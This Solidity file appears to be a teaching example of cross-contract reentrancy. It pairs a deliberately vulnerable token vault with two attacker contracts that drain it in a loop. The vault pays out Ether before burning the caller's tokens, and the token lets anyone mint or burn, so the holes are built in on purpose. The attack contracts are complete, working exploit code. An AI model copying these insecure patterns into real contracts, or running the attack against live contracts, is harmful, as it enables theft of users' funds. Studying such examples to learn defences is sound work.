// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool);
}


contract ERC20 is IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner, address indexed spender, uint256 value
    );

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name;
    string public symbol;
    uint8 public decimals;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function transfer(address recipient, uint256 amount)
        external
        returns (bool)
    {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount)
        external
        returns (bool)
    {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        totalSupply -= amount;
        emit Transfer(from, address(0), amount);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external {
        _burn(from, amount);
    }
}


abstract contract ReentrancyGuard {
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;

    uint256 private _status;

    error ReentrancyGuardReentrantCall();

    constructor() {
        _status = NOT_ENTERED;
    }

    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be NOT_ENTERED
        if (_status == ENTERED) {
            revert ReentrancyGuardReentrantCall();
        }

        // Any calls to nonReentrant after this point will fail
        _status = ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = NOT_ENTERED;
    }

    /**
     * @dev Returns true if the reentrancy guard is currently set to "entered", which indicates there is a
     * `nonReentrant` function in the call stack.
     */
    function _reentrancyGuardEntered() internal view returns (bool) {
        return _status == ENTERED;
    }
}





contract cross_contract_reentrancy is ReentrancyGuard {
    ERC20 public immutable ccrt;

    constructor(ERC20 _ccrt){
        ccrt = _ccrt;
    }

    function deposit() external payable nonReentrant {
        ccrt.mint(msg.sender, msg.value); //eth to CCRT
    }


    function  withdraw() external nonReentrant {
        uint256 balance = ccrt.balanceOf(msg.sender);
        require(balance > 0, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: balance}(""); 
        // attacker call transfer ccrt balance to another account in the callback function.
        require(success, "Failed to send Ether"); 

        ccrt.burn(msg.sender, ccrt.balanceOf(msg.sender));
        //remove_account(msg.sender); // generally it used function call then they use this value.
    }
}



contract attack_cross_contract_reentrancy {
    cross_contract_reentrancy victim;
    ERC20 ccrt;
    attack2_cross_contract_reentrancy attacker2;
    uint256 amount = 1 ether;

    constructor(address _victim, address _ccrt) {
        victim = cross_contract_reentrancy(_victim);
        ccrt = ERC20(_ccrt);
       
    }
    function setattacker2(address _attacker2) public {
        attacker2 = attack2_cross_contract_reentrancy(_attacker2);
    }

    receive() external payable {
        ccrt.transfer(address(attacker2), msg.value);
    }

    function attack() public payable {
        victim.deposit{value: msg.value}();
        while(address(victim).balance >= amount){
            victim.withdraw();
            attacker2.send(msg.value, address(this));
        }
            
    }
    
}

contract attack2_cross_contract_reentrancy {
    cross_contract_reentrancy victim;
    ERC20 ccrt;
    uint256 amount = 1 ether;

    constructor(cross_contract_reentrancy _victim, ERC20 _ccrt) {
        victim = cross_contract_reentrancy(_victim);
        ccrt = ERC20(_ccrt);
    }

    function send(uint256 _amount, address attacker) public {
        ccrt.transfer(attacker, _amount);
    }
}